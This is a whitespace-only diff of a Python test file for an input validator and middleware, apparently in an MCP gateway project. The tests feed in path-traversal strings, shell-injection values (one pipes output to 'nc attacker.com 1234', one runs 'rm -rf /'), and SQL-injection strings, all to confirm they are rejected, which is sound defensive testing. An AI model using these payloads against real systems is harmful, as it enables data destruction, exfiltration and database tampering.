@@ -76,7 +76,7 @@ class TestSecurityValidator:
         # HTTP URIs should pass through
         result = SecurityValidator.validate_path("http://example.com/file")
         assert result == "http://example.com/file"
-        
+
         # Plugin URIs should pass through
         result = SecurityValidator.validate_path("plugin://my-plugin/resource")
         assert result == "plugin://my-plugin/resource"
@@ -94,7 +94,7 @@ class TestSecurityValidator:
         # Test with allowed roots
         result = SecurityValidator.validate_path("/srv/data/file.txt", ["/srv/data"])
         assert "/srv/data" in result
-        
+
         # Test rejection outside allowed roots
         with pytest.raises(ValueError, match="outside allowed roots"):
             SecurityValidator.validate_path("/tmp/file.txt", ["/srv/data"])
@@ -135,7 +135,7 @@ class TestOutputSanitizer:
         # Test valid MIME types
         assert SecurityValidator.validate_mime_type("text/plain") == "text/plain"
         assert SecurityValidator.validate_mime_type("application/json") == "application/json"
-        
+
         # Test invalid MIME types
         with pytest.raises(ValueError, match="Invalid MIME type"):
             SecurityValidator.validate_mime_type("invalid")
@@ -146,7 +146,7 @@ class TestOutputSanitizer:
         result = SecurityValidator.sanitize_text("\x1b[0m\x1b[1;31mText\x1b[0m")
         assert "\x1b" not in result
         assert result == "Text"
-        
+
         # Test cursor movement sequences
         result = SecurityValidator.sanitize_text("Hello\x1b[2JWorld")
         assert result == "HelloWorld"
@@ -168,10 +168,10 @@ class TestValidationMiddleware:
         app = MagicMock()
         middleware = ValidationMiddleware(app)
         middleware.enabled = False
-        
+
         request = MagicMock()
         call_next = AsyncMock(return_value="response")
-        
+
         result = await middleware.dispatch(request, call_next)
         assert result == "response"
         call_next.assert_called_once()
@@ -181,11 +181,11 @@ class TestValidationMiddleware:
         """Test path traversal detection."""
         app = MagicMock()
         middleware = ValidationMiddleware(app)
-        
+
         # Test path traversal patterns
         with pytest.raises(Exception, match="Path traversal"):
             middleware.validate_resource_path("../../../etc/passwd")
-        
+
         with pytest.raises(Exception, match="Path traversal"):
             middleware.validate_resource_path("/srv/data/../../secret.txt")
 
@@ -197,10 +197,10 @@ class TestValidationMiddleware:
             mock_settings.validation_strict = True
             with pytest.raises(ValueError, match="shell metacharacters"):
                 SecurityValidator.validate_shell_parameter("file.jpg; cat /etc/passwd")
-            
+
             with pytest.raises(ValueError, match="shell metacharacters"):
                 SecurityValidator.validate_shell_parameter("file.jpg && rm -rf /")
-            
+
             with pytest.raises(ValueError, match="shell metacharacters"):
                 SecurityValidator.validate_shell_parameter("file.jpg | nc attacker.com 1234")
 
@@ -210,11 +210,11 @@ class TestValidationMiddleware:
         # Test control character removal
         result = SecurityValidator.sanitize_text("Hello\x1b[31mWorld\x00")
         assert result == "HelloWorld"
-        
+
         # Test ANSI escape sequence removal
         result = SecurityValidator.sanitize_text("\x1b[1;31mRed Text\x1b[0m")
         assert result == "Red Text"
-        
+
         # Test preserving newlines and tabs
         result = SecurityValidator.sanitize_text("Line1\nLine2\tTab")
         assert result == "Line1\nLine2\tTab"
@@ -224,13 +224,13 @@ class TestValidationMiddleware:
         """Test SQL injection prevention."""
         with patch('mcpgateway.common.validators.config_settings') as mock_settings:
             mock_settings.validation_strict = True
-            
+
             # Test SQL injection patterns
             with pytest.raises(ValueError, match="SQL injection"):
                 SecurityValidator.validate_sql_parameter("'; DROP TABLE users; --")
-            
+
             with pytest.raises(ValueError, match="SQL injection"):
                 SecurityValidator.validate_sql_parameter("1' OR '1'='1")
-            
+
             with pytest.raises(ValueError, match="SQL injection"):
                 SecurityValidator.validate_sql_parameter("admin'--")
